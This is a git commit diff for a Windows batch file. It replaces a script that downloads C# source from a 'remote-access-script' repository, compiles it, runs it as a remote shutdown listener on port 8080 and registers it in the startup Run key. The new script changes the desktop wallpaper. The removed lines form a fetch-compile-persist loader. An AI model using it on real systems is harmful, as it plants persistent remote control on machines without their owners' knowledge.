80b79b8ebab7f59809983e73231883cc8b72dcc7
mickr309 <mickrosenau309@gmail.com>
2025-03-07 00:25:42 +0100

    Update commands.bat

--- commands.bat
+++ commands.bat
@@ -1,37 +1,15 @@
 @echo off
-:: Set variables
-set URL=https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/ShutdownServer.cs
-set FOLDER=C:\log
-set FILE=%FOLDER%\ShutdownServer.cs
-set EXE=%FOLDER%\ShutdownServer.exe
-set CSC=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+:: Set wallpaper image path
+set WALLPAPER_PATH="C:\Path\To\Your\images.jpg"
 
-:: Create folder if it doesn't exist
-if not exist "%FOLDER%" mkdir "%FOLDER%"
+:: Set the registry key to change the wallpaper
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %WALLPAPER_PATH% /f
 
-:: Download the C# code
-echo Downloading ShutdownServer.cs...
-powershell -Command "Invoke-WebRequest -Uri %URL% -OutFile %FILE%"
+:: Set the wallpaper style to "Fill" (other options: 0 = Centered, 2 = Stretched, 6 = Fit)
+reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
 
-:: Compile the C# file
-echo Compiling ShutdownServer.cs...
-"%CSC%" "%FILE%" /out:"%EXE%"
+:: Refresh the desktop to apply the change
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
-:: Run the executable immediately after compiling
-if exist "%EXE%" (
-    echo Server started. It will listen on port 8080 for shutdown requests.
-    start "" "%EXE%"
-) else (
-    echo Compilation failed.
-)
-
-:: Make it run on startup
-echo Adding to startup...
-set REGKEY="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-set REGVAL="ShutdownServer"
-set REGPATH="%EXE%"
-
-reg add %REGKEY% /v %REGVAL% /t REG_SZ /d "%REGPATH%" /f
-
-echo Setup complete. The server will start automatically on system startup.
-exit
+echo Wallpaper has been changed.
+pause
